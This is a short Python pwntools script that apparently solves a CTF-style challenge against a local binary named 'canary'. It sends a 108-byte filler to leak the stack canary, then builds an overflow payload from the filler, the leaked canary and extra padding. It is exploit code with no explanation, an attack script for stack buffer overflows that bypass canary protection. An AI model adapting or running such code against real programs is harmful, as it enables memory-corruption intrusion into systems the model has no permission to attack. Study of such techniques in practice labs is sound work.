from pwn import *

p = process("./canary")

payload = b"A" * 108 

p.recvuntil(":")
p.sendline("2")
p.recvuntil(":")
p.sendline(payload)
p.recvline()
canary = p.recvline().strip()

payload += canary
print(f"Canary is 0x{canary.hex()}")
payload += b"A"*20

p.recvuntil(":")
p.send(payload)